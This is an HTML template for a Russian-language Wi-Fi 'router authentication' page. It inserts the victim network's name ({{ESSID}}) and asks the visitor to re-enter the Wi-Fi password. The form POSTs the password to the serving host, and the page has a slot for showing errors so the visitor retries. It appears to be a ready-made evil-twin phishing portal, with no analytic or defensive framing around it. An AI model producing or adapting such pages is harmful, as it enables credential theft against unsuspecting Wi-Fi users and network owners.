<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{{ESSID}} — вход в сеть</title>
  <style>
    :root { --accent:#2563eb; --bg:#f3f4f6; --card:#fff; --text:#111827; --muted:#6b7280; }
    * { box-sizing:border-box; }
    body { margin:0; font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
           background:var(--bg); color:var(--text);
           min-height:100vh; display:flex; align-items:center; justify-content:center; padding:16px; }
    .card { background:var(--card); width:100%; max-width:380px; border-radius:16px;
            box-shadow:0 10px 30px rgba(0,0,0,.08); padding:28px 24px; }
    .logo { width:56px; height:56px; border-radius:14px; background:var(--accent);
            display:flex; align-items:center; justify-content:center; margin:0 auto 14px;
            color:#fff; font-size:26px; }
    h1 { font-size:20px; margin:0 0 4px; text-align:center; }
    p.sub { margin:0 0 20px; text-align:center; color:var(--muted); font-size:14px; }
    label { font-size:13px; color:var(--muted); display:block; margin-bottom:6px; }
    input[type=password] { width:100%; padding:12px 14px; border:1px solid #d1d5db;
            border-radius:10px; font-size:16px; margin-bottom:16px; }
    button { width:100%; padding:12px; border:0; border-radius:10px; background:var(--accent);
            color:#fff; font-size:16px; font-weight:600; cursor:pointer; }
    .err { background:#fee2e2; color:#991b1b; padding:10px 12px; border-radius:10px;
           font-size:14px; margin-bottom:16px; }
    .foot { margin-top:18px; text-align:center; color:var(--muted); font-size:12px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">&#128274;</div>
    <h1>{{ESSID}}</h1>
    <p class="sub">Для продолжения подключения подтвердите пароль сети Wi-Fi.</p>
    <!-- ВАЖНО: сервер показывает блок ошибки, подставляя {{ERROR}} -->
    {{ERROR}}
    <!-- Контракт: POST на /, поле пароля называется "password" -->
    <form method="POST" action="/">
      <label for="password">Пароль Wi-Fi</label>
      <input type="password" id="password" name="password" required
             minlength="8" placeholder="Введите пароль от роутера" autofocus>
      <button type="submit">Подключиться</button>
    </form>
    <div class="foot">Проверка подлинности маршрутизатора</div>
  </div>
</body>
</html>
